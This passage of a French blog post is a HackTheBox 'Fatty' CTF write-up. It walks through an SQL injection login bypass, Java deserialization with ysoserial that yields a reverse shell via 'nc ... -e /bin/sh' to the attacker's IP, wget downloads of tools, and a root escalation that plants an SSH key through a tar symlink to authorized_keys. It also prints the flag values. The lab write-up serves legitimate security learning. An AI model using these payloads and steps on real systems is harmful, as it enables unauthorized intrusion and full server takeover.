+<p>pouet&rsquo; UNION SELECT 1, &lsquo;qtc&rsquo;, &lsquo;<a href="mailto:qtc@mail.com">qtc@mail.com</a>&rsquo;, &lsquo;ABCD&rsquo;, &lsquo;admin</p>
+</blockquote>
+<p>Et nous avons une connexion en tant que qtc avec un rôle admin !</p>
+<a class="post-dummy-target" id="obtenir-un-accès-sur-le-serveur"></a><h2>Obtenir un accès sur le serveur</h2>
+<p>On a donc maintenant accès à des commandes &ldquo;admin&rdquo;. Il y a sans doute faire quelque chose à faire avec.</p>
+<p>Dans la liste on a :</p>
+<ul>
+<li><em>Uname</em> - Effectue un <em>uname</em> sur le serveur</li>
+<li><em>Users</em>  - Liste apparemment le contenu de <em>/home</em></li>
+<li><em>Netstat</em> - Effectue un netstat</li>
+<li><em>IpConfig</em> - Effectue un ipconfig</li>
+<li><em>ChangePassword</em> - Permet de changer le mot de passe, mais n&rsquo;est pas implémenté encore</li>
+</ul>
+<p>Après vérification dans le code serveur,  on peut vori qu&rsquo;on a tout bon pour les 4 premiers et il n&rsquo;y a aucune injection de commande possible. L&rsquo;idée est donc de se concentrer sur le <em>ChangePassword</em> qui pour le coup est un peu plus particulier.</p>
+<p>On regarde donc le code au niveau du serveur.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_changePW.png" alt="Code ChangePassword sur le serveur" class="lazyload"><figcaption class="image-caption">Code ChangePassword sur le serveur</figcaption></figure></p>
+<p>Et on voit une désérialisation vers un object <em>User</em>. On cherche un peu d&rsquo;information sur les désérialisation en java et on tombe vite sur le github <a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank">Java Deserialization Cheat Sheet</a>. Et il parle de <strong>CommonsCollections</strong>, une bibliothèque Java qui est justement utilisée pas notre client et notre serveur.</p>
+<p>On regarde un peu plus en détail notre code et on voit que cet objet sérialisé vient d&rsquo;un Base64 qui a été envoyé par le client. On va donc voir au niveau du code client, dans le fichier <em>htb/fatty/client/methods/Invoker.java</em> (Fonction <em>changePW()</em> là aussi).</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_serialized_user.png" alt="Envoi de l&amp;rsquo;objet sérialisé dans le code client" class="lazyload"><figcaption class="image-caption">Envoi de l&amp;rsquo;objet sérialisé dans le code client</figcaption></figure></p>
+<p>Dans un premier temps, on va faire en sorte qu&rsquo;il soit &ldquo;implémenté&rdquo; (C&rsquo;est à dire que cette fonction soit appelée). Pour ça, ça se passe dans le code du GUI, ligne 560.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_pwChangeButton.png" alt="Listener du bouton de changement de mot de passe" class="lazyload"><figcaption class="image-caption">Listener du bouton de changement de mot de passe</figcaption></figure></p>
+<p>On voit que lorsque l&rsquo;on appuie sur le bouton, le message &ldquo;<em>Not implemented yet.</em>&rdquo; est affiché dans tous les cas. On va supprimer l&rsquo;affichage de ce message et copier le fonctionnement des autre boutons pour appeler <em>changePW()</em>. On va donc mettre ce code (avec des valeurs &ldquo;poubelles&rdquo; dans l&rsquo;appel de la fonction puisqu&rsquo;on ne s&rsquo;en servira pas).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span> <span class="o">{</span>
+    <span class="n">ClientGuiTest</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">invoker</span><span class="o">.</span><span class="na">changePW</span><span class="o">(</span><span class="s">&#34;qtc&#34;</span><span class="o">,</span><span class="s">&#34;pouetpouet&#34;</span><span class="o">);</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">MessageBuildException</span><span class="o">|</span><span class="n">htb</span><span class="o">.</span><span class="na">fatty</span><span class="o">.</span><span class="na">shared</span><span class="o">.</span><span class="na">message</span><span class="o">.</span><span class="na">MessageParseException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="n">controlPanel</span><span class="o">,</span> <span class="s">&#34;Failure during message building/parsing.&#34;</span><span class="o">,</span> <span class="s">&#34;Error&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">JOptionPane</span><span class="o">.</span><span class="na">showMessageDialog</span><span class="o">(</span><span class="n">controlPanel</span><span class="o">,</span> <span class="s">&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span><span class="o">,</span> <span class="s">&#34;Error&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="n">textPane</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;Payload launched&#34;</span><span class="o">);</span> <span class="o">/*</span> <span class="n">Pour</span> <span class="n">être</span> <span class="n">sûr</span> <span class="n">que</span> <span class="n">ça</span> <span class="n">appelle</span> <span class="n">la</span> <span class="n">fonction</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Et maintenant, on modifie le code de <em>changePW()</em>. Dans un premier temps il nous faut une payload.</p>
+<p>Pour générer la payload, on va utiliser <a href="https://github.com/frohoff/ysoserial" target="_blank">ysoserial</a>, d&rsquo;après le fichier <em>META-INF/maven/fatty-server/fatty-server/pom.xml</em> le serveur utilise la version 3.1 de <em>commons-collections</em>. Il y a donc 5 payloads possibles via <em>ysoserial</em>, on les essayer une par une.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">java -jar ysoserial.jar CommonsCollectionsX <span class="s1">&#39;nc 10.10.14.58 51337 -e /bin/sh&#39;</span> <span class="p">|</span> base64 -w0
+</code></pre></td></tr></table>
+</div>
+</div><p>Ici, X est à remplacer par le numéro de payload. On obtient un base64 que l&rsquo;on va utiliser dans notre code. Pour cela il n&rsquo;y a qu&rsquo;à modifier la ligne</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">this</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">addArgument</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">serializedUser64</span><span class="o">));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>par</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="n">String</span> <span class="n">b64payload</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="cm">/* AJOUTER LA PAYLOAD OBTENUE */</span><span class="o">);</span>
+<span class="k">this</span><span class="o">.</span><span class="na">action</span><span class="o">.</span><span class="na">addArgument</span><span class="o">(</span><span class="n">b46payload</span><span class="o">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Comme d&rsquo;habitude on passe par les étapes compilations &amp; création du jar puis on ouvre un listener sur notre machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp <span class="m">51337</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>On lance le client, se connecte en admin, va dans <em>Change Password</em> puis sans même remplir le formulaire on clique sur <em>Change</em>.</p>
+<p>Et là, avec la payload <em>CommonsCollections5</em> on obtient un reverse shell sur la machine.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_reverse_shell.png" alt="Reverse shell sur Fatty" class="lazyload"><figcaption class="image-caption">Reverse shell sur Fatty</figcaption></figure></p>
+<p>Le fichier <em>user.txt</em> n&rsquo;a pas les droits de lecture (sans doute pour obliger les joueurs à avoir un shell pour le lire), on lui donne et le lit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">chmod +r user.txt
+cat user.txt
+	7fab2c31fc7173a86872db45ae922073
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="devenir-root">Devenir root</h1>
+<a class="post-dummy-target" id="obtenir-un-meilleur-shell"></a><h2>Obtenir un meilleur shell</h2>
+<p>Avant de devenir root, une première chose à faire est d&rsquo;avoir un shell digne de ce nom. Problème : Comme on l&rsquo;a vu on est dans un docker, il n&rsquo;y a donc quasiment aucun binaire.</p>
+<p>Celui dont nous avons le plus besoin est <strong>python</strong>. Pour ça, un dépot git existe : <a href="https://github.com/andrew-d/static-binaries" target="_blank">static-binaries</a> !</p>
+<p>On va donc le récupérer via un serveur HTTP fait en python sur ma machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
+wget 10.10.14.58:9000/python2.7 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#Le 2&gt;&amp;1 permet d&#39;avoir le retour du wget</span>
+wget 10.10.14.58:9000/python2.7.zip 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+chmod +x python2.7
+</code></pre></td></tr></table>
+</div>
+</div><p>Puis on effectue notre suite de commande habituelle pour avoir un beau shell intéractif</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/python2.7.zip ./python2.7 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+	&lt;Ctrl+Z&gt;
+
+stty -a <span class="p">|</span> head -n1 <span class="c1">#Je lis les valeurs rows &amp; columns</span>
+stty raw -echo
+<span class="nb">fg</span> <span class="c1">#Il faut faire plusieures fois entrée</span>
+stty rows X columns Y <span class="c1">#Avec X et Y les valeurs lues plus haut</span>
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color	
+</code></pre></td></tr></table>
+</div>
+</div><a class="post-dummy-target" id="trouver-le-point-dentrée"></a><h2>Trouver le point d&rsquo;entrée</h2>
+<p>Maintenant, il faut trouver comment accéder au root de la machine sachant que nous sommes dans un docker.</p>
+<p>J&rsquo;utilise donc <a href="https://github.com/DominicBreuker/pspy" target="_blank">pspy</a> pour voir ce qu&rsquo;il se passe (ici encore récupéré via wget). Et on voit chaque minute une commande est executée par notre utilisateur.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ash -c scp -f /opt/fatty/tar/logs.tar 
+</code></pre></td></tr></table>
+</div>
+</div><p>L&rsquo;option <strong>-f</strong> de scp est non-documentée. En réalité c&rsquo;est un serveur distant qui demande à notre docker de lui envoyer le fichier <em>/opt/fatty/tar/logs.tar</em>. A partir de là on peut établir une hypothèse sur ce qui est executé sur le serveur que l&rsquo;on veut atteindre.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">scp qtc@&lt;IP DOCKER&gt;:/opt/fatty/tar/logs.tar .
+tar -xvf logs.tar
+</code></pre></td></tr></table>
+</div>
+</div><p>On peut ensuite supposer que ces commandes seront executées en tant que root.</p>
+<p>Si ces hypothèses savèrent vraies, alors on peut facilement obtenir le shell root.</p>
+<a class="post-dummy-target" id="obtenir-un-shell-root"></a><h2>Obtenir un shell root</h2>
+<p>Pour obtenir un shell root en exploitant <em>scp</em> et <em>tar</em>, il faut utiliser un lien symbolique.</p>
+<p>En effet, une archive peut contenir un lien symbolique. En décompressant celle-ci le lien symbolique est gardé intacte.  Par exemple :</p>
+<ul>
+<li>
+<p>Je créé un lien symbolique</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ln -s /tmp/fichier_test symlink
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Je le met dans une archive</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">tar -cvf archive.tar symlink
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>J&rsquo;envoie ce tar sur un autre machine</p>
+</li>
+<li>
+<p>Je décompresse le tar</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">tar -xvf archive.tar
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>J&rsquo;écris dans le fichier symlink</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;Test test&#34;</span> &gt; symlink
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Le fichier <em>/tmp/fichier_test</em> existe et contient notre test</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cat /etc/fichier_test
+  Test <span class="nb">test</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p>Dans notre cas, nous que la décompression sur le serveur cible transforme <em>logs.tar</em> en lien symbolique vers <em>/root/.ssh/authorized_keys</em> afin de pouvoir, lors d&rsquo;un second scp, écrire sur celui-ci.</p>
+<p>Donc on fait comme suit :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ln -s /root/.ssh/authorized_keys logs.tar
+tar -cvf archive.tar logs.tar
+cp archive.tar /opt/fatty/tar/logs.tar
+</code></pre></td></tr></table>
+</div>
+</div><p>On attend ensuite un scp (une minute, on peut voir son déclenchement avec <em>pspy</em>). Puis on remplace notre lien symbolique par un fichier contenant notre clef publique SSH</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;ssh-rsa AAAAB &lt;REDACTED&gt; vHXw== driikolu@Terweb&#34;</span> &gt; id_rsa.pub
+cp id_rsa.pub /opt/fatty/tar/logs.tar
+</code></pre></td></tr></table>
+</div>
+</div><p>Là encore on attend le scp puis sur notre machine on fait</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh root@10.10.10.174
+</code></pre></td></tr></table>
+</div>
+</div><p>Et nous avons un accès SSH direct en root. Il ne nous reste plus qu&rsquo;à lire le <em>root.txt</em>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cat root.txt 
+	ee982fa19b413415391ed4a17b2bd9c7
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="conclusion">Conclusion</h1>
+<p>J&rsquo;ai trouvé cette box très intéréssante, c&rsquo;était ma première de niveau &ldquo;Insane&rdquo; et je pense que celui-ci n&rsquo;est pas volé. J&rsquo;ai appris quelques trucs en la faisant (notamment sur CommonsCollections) et ça m&rsquo;a permis de me remettre légèrement au Java.</p>
+<p>Par contre, si ça n&rsquo;avait pas été dans un contexte CTF/HackTheBox je pense que je n&rsquo;aurais jamais trouvé la vulnérabilité de désérialisation. Dans ce genre de contexte quasiment tout a un sens et il existait forcément un chemin vers un accès serveur. En cas réel j&rsquo;aurais probablement mis ça de côté.</p>
+<p>Même si les clients lourds se font de plus en plus rare dans l&rsquo;informatique, j&rsquo;ai trouvé ça réaliste à ce niveau avec peut-être un bémol sur la <em>privesc</em> qui restait sympathique.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>The article was updated on 2020-08-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><span><a href="//twitter.com/share?url=%2f2020%2f08%2ffatty-wu%2f&amp;text=HackTheBox%20-%20Fatty%20Write-Up&amp;via=driikolu" target="_blank" title="Share on Twitter">
+            <i class="fab fa-twitter fa-fw"></i>
+        </a><a href="//www.facebook.com/sharer/sharer.php?u=%2f2020%2f08%2ffatty-wu%2f" target="_blank" title="Share on Facebook">
+            <i class="fab fa-facebook-square fa-fw"></i>
+        </a><a href="//reddit.com/submit?url=%2f2020%2f08%2ffatty-wu%2f&amp;title=HackTheBox%20-%20Fatty%20Write-Up" target="_blank" title="Share on Reddit">
+            <i class="fab fa-reddit fa-fw"></i>
+        </a><a href="//www.linkedin.com/shareArticle?url=%2f2020%2f08%2ffatty-wu%2f&amp;title=HackTheBox%20-%20Fatty%20Write-Up" target="_blank" title="Share on LinkedIn">
+            <i class="fab fa-linkedin fa-fw"></i>
+        </a></span></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section></section>
+        <section>
+            <span><a href="javascript:window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/03/install_arch_chiffre_uefi/" class="prev" rel="prev" title="Installation d&#39;Archlinux en UEFI &amp; chiffré"><i class="fas fa-angle-left fa-fw"></i>Installation d&#39;Archlinux en UEFI &amp; chiffré</a></div>
+</div><div class="post-comment"></div>
+    </article></div>
+            </main><footer class="footer">
+    <div class="copyright"><div class="copyright-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
+        </div>
+
+        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Driikolu</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+    </div>
+</footer></div><a href="#" class="dynamic-to-top" id="dynamic-to-top" data-scroll>
+            <span>&nbsp;</span>
+        </a><script src="/js/lib/jquery/jquery.slim.min.js"></script><script src="/js/lib/lazysizes/lazysizes.min.js"></script><script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.js"></script><script>window.scroll = new SmoothScroll('[data-scroll]', {speed: 300, speedAsDuration: true});</script><link rel="stylesheet" href="/css/lib/katex/katex.min.css"><script src="/js/lib/katex/katex.min.js"></script><script defer src="/js/lib/katex/auto-render.min.js"></script><link rel="stylesheet" href="/css/lib/katex/copy-tex.min.css"><script defer src="/js/lib/katex/copy-tex.min.js"></script><script defer src="/js/lib/katex/mhchem.min.js"></script><script>
+        document.addEventListener("DOMContentLoaded", function () {
+            renderMathInElement(document.body, {
+                delimiters: [
+                    { left: "$$", right: "$$", display: true },
+                    { left: "\\(", right: "\\)", display: false },
+                    { left: "\\[", right: "\\]", display: true },{ left: "$", right: "$", display: false },]
+            });
+        });
+    </script><script src="/js/blog.min.js"></script></body>
+</html>
